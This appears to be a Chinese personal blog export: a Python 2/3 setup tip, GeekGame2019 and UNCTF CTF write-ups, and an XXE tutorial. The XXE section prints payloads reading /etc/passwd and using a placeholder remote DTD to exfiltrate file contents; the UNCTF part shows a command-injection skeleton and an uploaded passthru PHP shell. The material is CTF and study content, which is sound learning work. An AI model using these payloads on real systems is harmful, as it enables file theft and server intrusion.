<p>使用pip命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 -m pip install xxx</span><br><span class="line">py -3 -m pip install xxx</span><br></pre></td></tr></table></figure></p>
<h3 id="方法二-网传的-不推荐"><a href="#方法二-网传的-不推荐" class="headerlink" title="方法二(网传的,不推荐)"></a>方法二(网传的,不推荐)</h3><p>进入Python27目录，将文件夹里的python.exe重命名为python2.exe，pythonw.exe重命名为pythonw2.exe<br>进入Python37目录，将文件夹里的python.exe重命名为python3.exe，pythonw.exe重命名为pythonw3.exe<br>打开cmd命令行窗口，分别输入Python2和Python3，正确的情况下应该分别进入python2.7和python3.7环境<br>写脚本在代码第一行加上<code>#! C:\python27\python2.exe</code>就是调用python2，python3同理</p>
<p>升级pip,即重装,先将python2和python3里的pip.exe删除,然后执行以下两个命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure></p>
<p>安装好后进行检验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip2 -v</span><br><span class="line">pip3 -v</span><br><span class="line">python2 -v</span><br><span class="line">python3 -v</span><br></pre></td></tr></table></figure></p>
<p>ps:实际上并没有用,pip2还得到他的Scripts目录下使用,辣鸡教程</p>
<h2 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h2><p>我把两个方法整合使用</p>
<p>使用python2和python3时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2</span><br><span class="line">python3</span><br></pre></td></tr></table></figure></p>
<p>使用pip时需要结合起来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install xxx</span><br><span class="line">python3 -m pip install xxx</span><br></pre></td></tr></table></figure></p>
<p>Perfect!!!</p>
]]></content>
      
        <categories>
            
            <category> 搭建 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GeekGame2019 wp]]></title>
      <url>/ctf-writeup/ckwd5ws7r002cd0uc3mqfsg8o/</url>
      <content type="html"><![CDATA[<p>因为前段时间比赛较多,积压了一些wp,也有很多题没来得及做平台就关了,唉!</p>
<h1 id="总分-4779"><a href="#总分-4779" class="headerlink" title="总分 4779"></a>总分 4779</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="MISC简介-50"><a href="#MISC简介-50" class="headerlink" title="MISC简介 50"></a>MISC简介 50</h2><p>拖进notepad里,结尾发现flag</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{3f97be46-9ed8-4847-b1ee-b7583c3406e2}</p>
<h2 id="TXT-629"><a href="#TXT-629" class="headerlink" title="TXT 629"></a>TXT 629</h2><p>在cmd里用nslookup工具查看</p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{59d9ca7b-4f39-4c0c-9334-c56c182076b5}</p>
<h2 id="图片中的XOR-786"><a href="#图片中的XOR-786" class="headerlink" title="图片中的XOR 786"></a>图片中的XOR 786</h2><p>使用stegsolve工具进行异或</p>
<p>首先保存 blue plane 0 red plane 0 green plane 0 alpha plane 0的图像,用alpha图像去异或blue</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{X0r_1n_pic}(我只能异或成这样了)</p>
<h2 id="BlindWaterMark-952"><a href="#BlindWaterMark-952" class="headerlink" title="BlindWaterMark 952"></a>BlindWaterMark 952</h2><p>用到BlindWaterMark工具,github上的脚本跑一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">image&lt;1.png&gt; + image(encoded)&lt;problem.png&gt; -&gt; watermark&lt;true.png&gt;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{blind_w4ter_mark}</p>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>volatility工具</p>
<p><a href="https://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">https://www.freebuf.com/column/152545.html</a></p>
<p><a href="https://blog.csdn.net/yingzinanfei/article/details/53165294" target="_blank" rel="noopener">https://blog.csdn.net/yingzinanfei/article/details/53165294</a></p>
<h2 id="as-code"><a href="#as-code" class="headerlink" title="as code"></a>as code</h2><p>先写个脚本把txt里的s和a转成二进制流</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">'C:\\Users\\Administrator\\Downloads'</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'as_code.txt'</span>): </span><br><span class="line">	exit(<span class="number">-1</span>) </span><br><span class="line">lines = open(<span class="string">'as_code.txt'</span>).readlines() </span><br><span class="line">fp = open(<span class="string">'as_code1.txt'</span>,<span class="string">'w'</span>) </span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">	fp.write( s.replace(<span class="string">'s'</span>,<span class="string">'0'</span>).replace(<span class="string">'a'</span>,<span class="string">'1'</span>)) </span><br><span class="line">	fp.close()</span><br></pre></td></tr></table></figure>
<p>我需要一个将二进制流转成图片的脚本</p>
<h2 id="一个zip"><a href="#一个zip" class="headerlink" title="一个zip"></a>一个zip</h2><p>熟悉的zip伪加密,拖进winhex里,找到所有的504B0102,将带有源文件头的0900加密改成0000</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>破解第一层</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto简介-50"><a href="#Crypto简介-50" class="headerlink" title="Crypto简介 50"></a>Crypto简介 50</h2><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{1282237383772259}</p>
<h2 id="Base64-50"><a href="#Base64-50" class="headerlink" title="Base64 50"></a>Base64 50</h2><p>解base64</p>
<p>scuctf{this_is_base64}</p>
<h2 id="CaesarCipher-50"><a href="#CaesarCipher-50" class="headerlink" title="CaesarCipher 50"></a>CaesarCipher 50</h2><figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{attack_at_dawn}</p>
<h2 id="字符串的数字形式-50"><a href="#字符串的数字形式-50" class="headerlink" title="字符串的数字形式 50"></a>字符串的数字形式 50</h2><p>先十六进制转ascil码得</p>
<p>%73%63%75%63%74%66%7b%75%72%6c%5f%63%6f%64%65%5f%61%6e%64%5f%68%65%78%7d</p>
<p>再对应url编码转换得</p>
<p>scuctf{url_code_and_hex}</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web简介-50"><a href="#Web简介-50" class="headerlink" title="Web简介 50"></a>Web简介 50</h2><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{8b93439b-8b46-45cf-b297-fea945a50abb}</p>
<h2 id="Javascript是世界上最好的语言-50"><a href="#Javascript是世界上最好的语言-50" class="headerlink" title="Javascript是世界上最好的语言 50"></a>Javascript是世界上最好的语言 50</h2><p>他会自动刷新,等一下就行了</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag:scuctf{m@st3r_0f_javasc1pt}</p>
<h2 id="Get-Post-50"><a href="#Get-Post-50" class="headerlink" title="Get?Post? 50"></a>Get?Post? 50</h2><p>根据提示,构造payload</p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>得到flag</p>
<p>scuctf{43832254-97aa-4ba1-ace5-4ecd0c1192e7}</p>
<h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p>选出一个对的后只需要刷新就可以一直记录次数</p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>用python脚本自动刷新,多线程还不会用,以后尽快完善脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh</span><span class="params">(url,num)</span>:</span></span><br><span class="line">    driver = webdriver.Chrome(<span class="string">"C:/python27/chromedriver.exe"</span>)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">        driver.refresh()</span><br><span class="line">    <span class="comment">#driver.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = input(<span class="string">"Please enter the url:\n"</span>)</span><br><span class="line">    num = int(input(<span class="string">"Enter the number of refresh:\n"</span>))</span><br><span class="line">    refresh(url,num)</span><br></pre></td></tr></table></figure>
<p>等待一段时间后得到flag</p>
<h2 id="源码泄露-629"><a href="#源码泄露-629" class="headerlink" title="源码泄露 629"></a>源码泄露 629</h2><p>通过自己写的扫描源码泄露小工具发现是.git泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">lists = [<span class="string">'/.git/config'</span>, <span class="string">'/.svn/entries'</span>, <span class="string">'web.rar'</span>, <span class="string">'www.rar'</span>, <span class="string">'wwwroot.rar'</span>, <span class="string">'1.rar'</span>, <span class="string">'bbs.zip'</span>, <span class="string">'website.rar'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'- - - - - - - - - - - - - - - - - - - -'</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">u'|    就是个自己用的小脚本 by Damya   |'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'- - - - - - - - - - - - - - - - - - - -'</span></span><br><span class="line"><span class="comment"># 用来输入需要探测的网址</span></span><br><span class="line">address = raw_input(<span class="string">'请输入URL地址：'</span>.decode(<span class="string">'utf-8'</span>).encode(<span class="string">'gbk'</span>))</span><br><span class="line"><span class="comment"># 把列表里的元素一个一个遍历出来</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lists:</span><br><span class="line">	<span class="comment"># 把网址和探测的文件连接到一起</span></span><br><span class="line">    tance = <span class="string">"%s/%s"</span> % (address, a)</span><br><span class="line">    <span class="comment"># print tance   </span></span><br><span class="line">	<span class="comment"># 使用 request 模块里的 get 来获取这个网址</span></span><br><span class="line">    qq = requests.get(url=tance)</span><br><span class="line">	<span class="comment"># 获取响应码并赋值给 dq</span></span><br><span class="line">    dq = qq.status_code</span><br><span class="line">	<span class="comment"># 判断响应码是否为 200 ，是，就进行下一步</span></span><br><span class="line">    <span class="keyword">if</span> dq == <span class="number">200</span> :</span><br><span class="line">		<span class="comment"># 输出 响应码和探测地址</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance)</span><br><span class="line">	<span class="comment"># 如果响应码不是 200 就进行着一步</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	<span class="comment"># 输入响应码和地址</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance)</span><br></pre></td></tr></table></figure>
<p>查看config文件,去github上下载源码,得到index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pR0b1em'</span>]) &amp;&amp; $_GET[<span class="string">'pR0b1em'</span>]==<span class="string">"oWh"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"flag"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"这里没有flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过提示传入 ?pR0b1em=oWh 得到flag<br>scuctf{30d3a3f4-51f5-4166-8561-e443d7b7704e}</p>
<h2 id="一个简单的反序列化"><a href="#一个简单的反序列化" class="headerlink" title="一个简单的反序列化"></a>一个简单的反序列化</h2><p>调后台看到注释,分析代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> $grades = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $score, $grades)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;score = $score;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;grades = $grades;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;score)&amp;&amp;<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;grades)) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'payload'</span>])) &#123;</span><br><span class="line">    $a = unserialize($_POST[<span class="string">'payload'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="First-reverse-848"><a href="#First-reverse-848" class="headerlink" title="First reverse 848"></a>First reverse 848</h2><p>拖进ida里在main函数f5看伪代码,将变量名转字符,倒过来读取</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{W3lc0me_Jo1n_R3D0g_!!}</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="hello-pwn-签到-535"><a href="#hello-pwn-签到-535" class="headerlink" title="hello_pwn(签到) 535"></a>hello_pwn(签到) 535</h2><figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>scuctf{238b659c3ccc9bd1bf68f97c8ec76a0a9e38a67226a45ef3456065ef}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB XML与XXE漏洞(伪协议)]]></title>
      <url>/web%E5%AD%A6%E4%B9%A0/ckwd5ws8r003wd0uc2bl5xp9u/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做unctf时遇到一道web题,是xml的xxe漏洞(Do you like xml),当时没做出来,没反应过来这个知识点,后来经人指点稍微理解了一些关于这个的漏洞,又在判作业中看到了这个知识点,所以决定记录下来</p>
<hr>
<h2 id="XML与XXE漏洞及伪协议利用"><a href="#XML与XXE漏洞及伪协议利用" class="headerlink" title="XML与XXE漏洞及伪协议利用"></a>XML与XXE漏洞及伪协议利用</h2><p>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>这道题可以通过伪协议读取flag.php的内容,从而getflag</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="注入上的实战使用"><a href="#注入上的实战使用" class="headerlink" title="注入上的实战使用"></a>注入上的实战使用</h2><p>XML当被允许引用外部实体的时候，就存在有被注入的危险，注入的方式有很多，如下</p>
<h3 id="读取用户端保存的密码"><a href="#读取用户端保存的密码" class="headerlink" title="读取用户端保存的密码"></a>读取用户端保存的密码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">content</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;content;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="通过读取上传文件执行xxe"><a href="#通过读取上传文件执行xxe" class="headerlink" title="通过读取上传文件执行xxe"></a>通过读取上传文件执行xxe</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxx.xxx.xxx.xxx/xxe.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>xxe.dtd的文件内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="利用php伪协议读取任意文件"><a href="#利用php伪协议读取任意文件" class="headerlink" title="利用php伪协议读取任意文件"></a>利用php伪协议读取任意文件</h3><p>用php伪协议读取任意文件，当数据无回显的时候还可以将数据发送到远程服务器进行读取</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/etc/issue"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxx.xxx.xxx.xxx/xxe.dtd"</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">%dtd;</span></span></span><br><span class="line"><span class="meta"><span class="meta">%file;</span></span></span><br><span class="line"><span class="meta"><span class="meta">]&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>xxe.dtd的内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/?%file;'&gt;"</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p>
<h3 id="检测目标ip的端口开放情况"><a href="#检测目标ip的端口开放情况" class="headerlink" title="检测目标ip的端口开放情况"></a>检测目标ip的端口开放情况</h3><p>可以通过返回的错误信息来检测目标IP的端口开放情况<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxx.xxx.xxx.xxx:80/"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;xxe;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这种方式可以探测到目标的80端口，通过返回的“Connection refused”可以知道该80端口是未开放的，若返回的是”HTTP request failed!”，可以知道80端口是开放的。</p>
]]></content>
      
        <categories>
            
            <category> web学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UNCTF wp]]></title>
      <url>/ctf-writeup/ckwd5ws8v0042d0uc94pj0gxx/</url>
      <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="checkinA-100"><a href="#checkinA-100" class="headerlink" title="checkinA  100"></a>checkinA  100</h2><p>签到题,root用户会给你flag,提交里面的字符串</p>
<h2 id="Simple-Calc-1-200"><a href="#Simple-Calc-1-200" class="headerlink" title="Simple_Calc_1  200"></a>Simple_Calc_1  200</h2><p>sqlmap跑出来flag,第一个是对的 <figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h2 id="Simple-Calc-2-400"><a href="#Simple-Calc-2-400" class="headerlink" title="Simple_Calc_2  400"></a>Simple_Calc_2  400</h2><p>根据hint在计算的时候抓包,发现可以执行命令,于是试着闭合语句,得到基本payload框架</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">echo</span> ; <span class="comment"># //在 ; # 之间输入命令即可执行</span></span><br></pre></td></tr></table></figure>
<p>看了下目录下的几个文件源码(发现并没有用)<br>然后在/目录下看到flag.txt</p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>用tac命令读取</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="上传给小姐姐的照片-100"><a href="#上传给小姐姐的照片-100" class="headerlink" title="上传给小姐姐的照片  100"></a>上传给小姐姐的照片  100</h2><p>发现可以直接上传php文件,burpsuite抓包开始试探</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//passthru(<span class="string">"ls"</span>);  //能执行</span><br><span class="line">//passthru(<span class="string">"ls /var/www/html"</span>);</span><br><span class="line">passthru(<span class="string">"cat /var/www/html/flag.php"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="NSB-Login-200"><a href="#NSB-Login-200" class="headerlink" title="NSB Login  200"></a>NSB Login  200</h2><p>试探出存在admin用户,burpsuite抓包跑字典(字典要选对,跑了好久)</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="WEB1-100"><a href="#WEB1-100" class="headerlink" title="WEB1  100"></a>WEB1  100</h2><p>我的源码泄露检测小脚本跑出有<a href="http://www.zip文件,下载查看,拖进notepad里看到php代码" target="_blank" rel="noopener">www.zip文件,下载查看,拖进notepad里看到php代码</a></p>
